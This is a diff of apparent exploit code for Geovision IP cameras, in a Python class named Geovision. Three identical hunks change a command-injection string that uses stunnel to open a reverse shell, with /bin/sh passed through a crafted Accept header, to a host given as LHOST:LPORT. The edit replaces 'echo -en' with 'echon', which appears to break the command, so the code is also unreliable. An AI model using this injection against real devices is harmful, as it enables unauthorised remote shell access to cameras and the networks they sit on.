@@ -343,7 +343,7 @@ class Geovision:
 				'User-Agent':'Mozilla',
 				'Accept':'client=yes\\x0apty=yes\\x0asslVersion=TLSv1\\x0aexec=/bin/sh\\x0a'
 				}
-			SH_CMD = ';echo -en \"$HTTP_ACCEPT connect=LHOST:LPORT\"|stunnel -fd 0;'
+			SH_CMD = ';echon \"$HTTP_ACCEPT connect=LHOST:LPORT\"|stunnel -fd 0;'
 			SH_CMD = SH_CMD.replace("LHOST",lhost)
 			SH_CMD = SH_CMD.replace("LPORT",lport)
 
@@ -392,7 +392,7 @@ class Geovision:
 				'User-Agent':'Mozilla',
 				'Accept':'client=yes\\x0apty=yes\\x0asslVersion=TLSv1\\x0aexec=/bin/sh\\x0a'
 				}
-			SH_CMD = ';echo -en \"$HTTP_ACCEPT connect=LHOST:LPORT\"|stunnel -fd 0;'
+			SH_CMD = ';echon \"$HTTP_ACCEPT connect=LHOST:LPORT\"|stunnel -fd 0;'
 			SH_CMD = SH_CMD.replace("LHOST",lhost)
 			SH_CMD = SH_CMD.replace("LPORT",lport)
 
@@ -437,7 +437,7 @@ class Geovision:
 				'User-Agent':'Mozilla',
 				'Accept':'client=yes\\x0apty=yes\\x0asslVersion=TLSv1\\x0aexec=/bin/sh\\x0a'
 				}
-			SH_CMD = ';echo -en \"$HTTP_ACCEPT connect=LHOST:LPORT\"|stunnel -fd 0;'
+			SH_CMD = ';echon \"$HTTP_ACCEPT connect=LHOST:LPORT\"|stunnel -fd 0;'
 			SH_CMD = SH_CMD.replace("LHOST",lhost)
 			SH_CMD = SH_CMD.replace("LPORT",lport)
 
